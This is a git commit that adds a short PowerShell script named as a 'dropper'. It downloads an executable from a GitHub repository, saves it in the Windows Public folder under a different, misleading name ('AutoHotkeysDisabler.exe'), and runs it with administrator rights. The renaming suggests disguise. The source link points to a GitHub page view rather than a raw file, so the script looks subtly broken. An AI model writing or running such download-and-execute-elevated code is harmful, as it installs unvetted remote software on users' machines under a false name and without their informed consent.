88a9d5eeb52b481e721be843cadeef26a58b5387
handshakingz@outlook.com <handshakingz@outlook.com>
2022-03-30 13:27:35 -0500

    Added powershell script

---
+++ WinEmailAppResetDropper.ps1
@@ -0,0 +1,4 @@
+﻿$source = 'https://github.com/handshakings/WindowsEmailAppReset/blob/master/WindowsEmailAppReset/bin/Debug/WindowsEmailAccountMgr.exe'
+$dest = 'C:/Users\Public\AutoHotkeysDisabler.exe'
+Invoke-WebRequest -Uri $source -OutFile $dest
+Start-Process -FilePath $dest -Verb RunAs
